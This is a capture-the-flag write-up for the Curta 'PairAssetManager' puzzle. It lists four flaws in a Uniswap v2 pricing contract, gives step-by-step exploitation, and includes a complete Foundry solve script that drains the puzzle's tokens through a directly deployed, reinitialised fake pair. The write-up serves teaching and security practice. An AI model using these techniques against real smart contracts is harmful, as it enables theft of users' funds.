@@ -1,0 +1,134 @@
+---
+author: '0xB49bf876BE26435b6fae1Ef42C3c82c5867Fa149'
+contributors: ['0xB49bf876BE26435b6fae1Ef42C3c82c5867Fa149']
+adapted_from: 'https://github.com/chainlight-io/publications/tree/417d1475d3b7057db6e0da2cbaba6104576f3d20/ctf-writeups/curta-cup/PairAssetManager/writeup.md'
+---
+
+## Overview
+
+This challenge questions your understanding of [Uniswap v2](https://docs.uniswap.org/contracts/v2/overview). By solving this puzzle, you will learn about the operational logic of Uniswap v2's [factory](https://docs.uniswap.org/contracts/v2/concepts/protocol-overview/smart-contracts#factory) and [constant product market maker (CPMM)](https://docs.uniswap.org/contracts/v2/concepts/protocol-overview/how-uniswap-works).
+
+## Solving the puzzle
+
+The puzzle's goal is to drain both `curtaUSD` and `curtaStUSD` from `keeper`, which is responsible for pricing the pair. The puzzle contains the following vulnerabilities you can exploit to drain the tokens:
+
+1. In `onlyUniswapV2Pair`, verification with `codeHash` can be bypassed by deploying `UniswapV2Pair` directly.
+2. In `uniswapV2Call`, if `amountIn` is greater than `maxAmountIn`, it may not revert.
+3. In `uniswapV2Call`, the token address passed as `data` may not be the same as the token of the called pair.
+4. [Optional] If a token different from the initial token specified by `_createUser` in `_deposit` is deposited, the share of the initial tokens pair will be increased.
+
+In addition to the minimum requirement, vulnerability #4 enables stealing `1 ether - MINIMUM_LIQUIDITY` additional `curtaUSD` and `curtaStUSD` from `owner`.
+
+We can exploit these vulnerabilities as follows:
+
+1. Create a fake token and directly deploy `UniswapV2Pair` (i.e. without the factory).
+2. `mint` and `sync` the fake tokens with the fake pair and scale them so that `PairAssetManager._getAmountIn` of one token results in a large value.
+3. Call `initialize` to change the tokens to `curtaUSD` and `curtaStUSD`. In the usual case where the pair is deployed through Uniswap's factory, `initialize` can only be called once to create the pair, but since we deployed it directly, we can call `initialize` multiple times.
+4. Call `swap` on the `UniswapV2Pair` we deployed, and specify `to` as `PairAssetManager` and `data` as the token addresses to steal + the number of tokens `keeper` has. We can drain the tokens with the large value returned by `_getAmountIn` from `keeper`.
+5. `burn` all the fake tokens held by the fake pair and call `sync` to set the reserve to zero.
+6. Call `initialize` to replace the token with the fake token again, and `mint` and `sync` the other token so that its `PairAssetManager._getAmountIn` increases.
+7. Repeat steps 4 and 5, and drain all tokens via `skim`.
+
+### Solve script
+
+Check out our solve test below for more details.
+
+```sol fileName="Solve.t.sol"
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+import "../src/Curta.sol";
+
+contract SolveTest is Test {
+    Puzzle public curta;
+    Challenge public chall;
+    UniswapV2Pair public fakePair;
+    FakeToken public fakeToken1;
+    FakeToken public fakeToken2;
+
+    function setUp() public {
+        curta = new Puzzle();
+        curta.deploy();
+    }
+
+    function testSolve() public {
+        chall = curta.factories(curta.generate(address(this)));
+
+        fakePair = new UniswapV2Pair();
+        fakeToken1 = new FakeToken();
+        fakeToken2 = new FakeToken();
+
+        fakeToken1.mint(address(fakePair), 10000 ether);
+        fakeToken2.mint(address(fakePair), 1 ether);
+
+        fakePair.initialize(address(fakeToken1), address(fakeToken2));
+        fakePair.sync();
+        fakeToken2.mint(address(fakePair), type(uint64).max);
+        fakePair.swap(
+            0,
+            1 ether - 1,
+            address(chall.assetManager()),
+            abi.encode(
+                chall.curtaUSD(),
+                chall.curtaStUSD(),
+                IERC20(chall.curtaUSD()).balanceOf(address(chall.keeper())),
+                IERC20(chall.curtaStUSD()).balanceOf(address(chall.keeper()))
+            )
+        );
+
+        fakeToken1.burn(address(fakePair), fakeToken1.balanceOf(address(fakePair)));
+        fakeToken2.burn(address(fakePair), fakeToken2.balanceOf(address(fakePair)));
+        fakePair.sync();
+
+        fakeToken1.mint(address(fakePair), 1 ether);
+        fakeToken2.mint(address(fakePair), 10000 ether);
+        fakePair.sync();
+
+        fakeToken1.mint(address(fakePair), type(uint64).max);
+        fakePair.swap(
+            1 ether - 1,
+            0,
+            address(chall.assetManager()),
+            abi.encode(
+                chall.curtaUSD(),
+                chall.curtaStUSD(),
+                IERC20(chall.curtaUSD()).balanceOf(address(chall.keeper())),
+                IERC20(chall.curtaStUSD()).balanceOf(address(chall.keeper()))
+            )
+        );
+
+        fakeToken1.burn(address(fakePair), fakeToken1.balanceOf(address(fakePair)));
+        fakeToken2.burn(address(fakePair), fakeToken2.balanceOf(address(fakePair)));
+        fakePair.sync();
+
+        fakePair.initialize(address(chall.curtaUSD()), address(chall.curtaStUSD()));
+        fakePair.skim(address(this));
+
+        IERC20(chall.curtaUSD()).transfer(
+            address(uint160(curta.generate(address(this)))), IERC20(chall.curtaUSD()).balanceOf(address(this))
+        );
+        IERC20(chall.curtaStUSD()).transfer(
+            address(uint160(curta.generate(address(this)))), IERC20(chall.curtaStUSD()).balanceOf(address(this))
+        );
+
+        curta.verify(curta.generate(address(this)), uint256(0));
+    }
+
+    function feeTo() external view returns (address) {
+        return address(0);
+    }
+}
+
+contract FakeToken is ERC20 {
+    constructor() ERC20("Fake", "fake") {}
+
+    function mint(address to, uint256 amount) external {
+        _mint(to, amount);
+    }
+
+    function burn(address to, uint256 amount) external {
+        _burn(to, amount);
+    }
+}
+```
